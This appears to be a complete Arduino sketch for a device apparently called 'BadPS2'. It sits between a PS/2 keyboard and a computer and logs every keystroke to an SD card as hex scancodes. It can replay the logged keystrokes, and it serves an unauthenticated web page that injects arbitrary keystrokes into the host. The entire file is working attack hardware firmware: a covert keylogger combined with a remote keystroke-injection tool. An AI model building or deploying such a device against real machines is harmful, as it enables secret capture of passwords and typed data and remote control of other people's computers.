#include <SPI.h>
#include <Ethernet.h>
#include <SD.h>
int dataPinIn = 2;
int clockPinIn = 3;
int dataPinOut = 18;
int clockPinOut = 19;
int sdPin = 10;
int readerPin = 44;
int writerPin = 46;
int senderPin = 48;
char* filename = "data.txt";
byte mac[] = {0x90, 0xa2, 0xda, 0x0e, 0x0c, 0x2d};
byte ip[] = {192, 168, 2, 177};
EthernetServer webServer(80);


void setup() {
  pinMode(readerPin, INPUT);
  pinMode(writerPin, INPUT);
  pinMode(senderPin, INPUT);
  delay(1000);
  Serial.begin(9600);
  initKeys(dataPinIn, clockPinIn);
  initCard(sdPin);
  Ethernet.begin(mac, ip);
  webServer.begin();
}


void loop() {
  if (digitalRead(readerPin) == HIGH) {
    reader(filename);
  }
  else if (digitalRead(writerPin) == HIGH) {
    writer(filename);
    delay(1000);
    exit(0);
  }
  else if (digitalRead(senderPin) == HIGH) {
    website(webServer);
  }
  else {
    Serial.println("No function selected");
    delay(1000);
  }
}


/*****************************************************
 * Functionalities
 *****************************************************/

void reader(char* filename) {
  unsigned char data = readKeys(dataPinIn, clockPinIn);
  if (data) {
    writeKeys(dataPinOut, clockPinOut, data);
    String content = String(data, HEX) + " ";
    if (data < 0x10) content = "0" + content;
    Serial.print(content);
    writeFile(filename, content);
  }
  else Serial.println("Error reading keyboard");
}


void sender(String content, char* separator) {
  int place;
  unsigned char data;
  do {
    place = content.indexOf(separator);
    if (place != -1) {
      data = (unsigned char) strtol(content.substring(0, place).c_str(), NULL, 16);
      Serial.println(data, HEX);
      if (data == 0x00) delay(2000);
      else writeKeys(dataPinOut, clockPinOut, data);
      place += 1;
      content = content.substring(place, content.length());
    } else if (content.length() > 0) Serial.println(content);
  } while (place >= 0);
}


void writer(char* filename) {
  String content = readFile(filename);
  Serial.println("Content of " + String(filename));
  sender(content, " ");
}


void website(EthernetServer webServer) {
  EthernetClient client = webServer.available();
  if (client) {
    String buffer;
    while (client.connected()) {
      if (client.available()) {
        char c = client.read();
        buffer += c;
        if (c == '\n') {
          if (buffer.indexOf("favicon") == -1) {
            sendWebsite(client);
            int first = buffer.indexOf("scan=") + 5;
            String data = buffer.substring(first);
            int last = data.indexOf(" ");
            sender(data.substring(0, last), "+");
            break;
          }
        }
      }
    }
    delay(1);
    client.stop();
  }
}


/*****************************************************
 * Keyboard
 *****************************************************/

void initKeys(int dataPin, int clockPin) {
  setHigh(clockPin);
  setHigh(dataPin);
  sendCommand(dataPin, clockPin, 0xff);
  readKeys(dataPin, clockPin);
  readKeys(dataPin, clockPin);
  Serial.println("Keyboard initialized");
}


void setHigh(int pin) {
  pinMode(pin, INPUT);
  digitalWrite(pin, HIGH);
}


void setLow(int pin) {
  pinMode(pin, OUTPUT);
  digitalWrite(pin, LOW);
}


unsigned char readKeys(int dataPin, int clockPin) {
  unsigned char data = 0x00;
  unsigned char bit = 0x01;
  setHigh(clockPin);
  setHigh(dataPin);
  delayMicroseconds(50);
  while (digitalRead(clockPin) == HIGH);
  while (digitalRead(clockPin) == LOW);
  for (int i=0; i<8; i++) {
    while (digitalRead(clockPin) == HIGH);
    if (digitalRead(dataPin) == HIGH) data = data | bit;
    while (digitalRead(clockPin) == LOW);
    bit = bit << 1;
  }
  while (digitalRead(clockPin) == HIGH);
  while (digitalRead(clockPin) == LOW);
  while (digitalRead(clockPin) == HIGH);
  while (digitalRead(clockPin) == LOW);
  setLow(clockPin);
  return data;
}


void writeKeys(int dataPin, int clockPin, unsigned char data) {
  unsigned char parity = 1;
  setLow(dataPin);
  setLow(clockPin);
  delayMicroseconds(50);
  setHigh(clockPin);
  for (int i=0; i<8; i++) {
    if (data & 0x01) setHigh(dataPin);
    else setLow(dataPin);
    setLow(clockPin);
    delayMicroseconds(50);
    setHigh(clockPin);
    parity = parity ^ (data & 0x01);
    data = data >> 1;
  }
  if (parity) setHigh(dataPin);
  else setLow(dataPin);
  setLow(clockPin);
  delayMicroseconds(50);
  setHigh(clockPin);
  setHigh(dataPin);
  setLow(clockPin);
  delayMicroseconds(50);
  setHigh(clockPin);
}


void sendCommand(int dataPin, int clockPin, unsigned char data) {
  unsigned char parity = 1;
  setHigh(dataPin);
  setHigh(clockPin);
  delayMicroseconds(300);
  setLow(clockPin);
  delayMicroseconds(300);
  setLow(dataPin);
  delayMicroseconds(10);
  setHigh(clockPin);
  while (digitalRead(clockPin) == HIGH);
  for (int i=0; i<8; i++) {
    if (data & 0x01) setHigh(dataPin);
    else setLow(dataPin);
    while (digitalRead(clockPin) == LOW);
    while (digitalRead(clockPin) == HIGH);
    parity = parity ^ (data & 0x01);
    data = data >> 1;
  }
  if (parity) setHigh(dataPin);
  else setLow(dataPin);
  while (digitalRead(clockPin) == LOW);
  while (digitalRead(clockPin) == HIGH);
  setHigh(dataPin);
  delayMicroseconds(50);
  while (digitalRead(clockPin) == HIGH);
  while ((digitalRead(clockPin) == LOW) || (digitalRead(dataPin) == LOW));
  setLow(clockPin);
}


/*****************************************************
 * SD Card
 *****************************************************/

void initCard(int sdPin) {
  pinMode(sdPin, OUTPUT);
  digitalWrite(sdPin, HIGH);
  if (!SD.begin(4)) Serial.println("Error finding SD card");
  else Serial.println("SD card initialized");
}


String readFile(char* filename) {
  String content;
  if (SD.exists(filename)) {
    File file = SD.open(filename, FILE_READ);
    while (file.available()) content.concat((char) file.read());
    file.close();
  }
  else Serial.println("Error finding " + String(filename));
  return content;
}


void writeFile(char* filename, String content) {
  File file = SD.open(filename, FILE_WRITE);
  if (file) {
    file.print(content);
    file.close();
  }
  else Serial.println("Error writing " + String(filename));
}


/*****************************************************
 * Website
 *****************************************************/

void sendWebsite(EthernetClient client) {
  client.println("HTTP/1.1 200 OK");
  client.println("Content-Type: text/html");
  client.println("Connection: close");
  client.println();
  client.print("<!DOCTYPE html><html><head><title>BadPS2 Input</title><meta charset='utf-8'></head><body><h1>BadPS2 Input</h1>Press keys to create PS/2 scancodes.<br />Click send to execute the keystrokes on the host.<br /><br /><form method='GET' action='/'><textarea id='scan' name='scan' rows='5' cols='33' readonly></textarea><br /><input type='button' onclick='deleteLast();' value='Delete' /><input type='button' onclick='deleteAll();' value='Delete All' /><input type='button' onclick='insertDelay();' value='Insert Delay' /><input type='submit' value='Send' /></form>");
  client.print("<script type='text/javascript'>function deleteLast(){scan.value=scan.value.substr(0,scan.value.lastIndexOf(' '))}function deleteAll(){scan.value=''}function insertDelay(){scan.value+=scan.value?' 00':'00'}var keys={8:'66',9:'0d',13:'5a',16:'12',17:'14',18:'11',19:'e1 14 77 e1 f0 14 f0 77',20:'58',27:'76',32:'29',33:'e0 7d',34:'e0 7a',35:'e0 69',36:'e0 6c',37:'e0 6b',38:'e0 75',39:'e0 74',40:'e0 72',45:'e0 70',46:'e0 71',48:'45',49:'16',50:'1e',51:'26',52:'25',53:'2e',54:'36',55:'3d',56:'3e',57:'46',65:'1c',66:'32',67:'21',68:'23',69:'24',70:'2b',71:'34',72:'33',73:'43',74:'3b',75:'42',76:'4b',77:'3a',78:'31',79:'44',80:'4d',81:'15',82:'2d',83:'1b',84:'2c',85:'3c',86:'2a',87:'1d',88:'22',89:'35',90:'1a',91:'e0 1f',92:'e0 27',93:'e0 2f',96:'70',97:'69',98:'72',99:'7a',100:'6b',101:'73',102:'74',103:'6c',104:'75',105:'7d',106:'7c',107:'79',109:'7b',110:'71',111:'e0 4a',112:'05',113:'06',114:'04',115:'0c',116:'03',117:'0b',118:'83',119:'0a',120:'01',121:'09',122:'78',123:'07',144:'77',145:'7e',186:'4c',187:'55',188:'41',189:'4e',190:'49',191:'4a',192:'0e',219:'54',220:'5d',221:'5b',222:'52'},scan=document.getElementById('scan');document.onkeydown=function(e){scan.value=scan.value?scan.value+' '+keys[e.keyCode]:keys[e.keyCode]},document.onkeyup=function(e){19!==e.keyCode&&(scan.value+=keys[e.keyCode].length>2?' '+keys[e.keyCode].substr(0,2)+' f0 '+keys[e.keyCode].substr(3):' f0 '+keys[e.keyCode])};</script></body></html>");
}
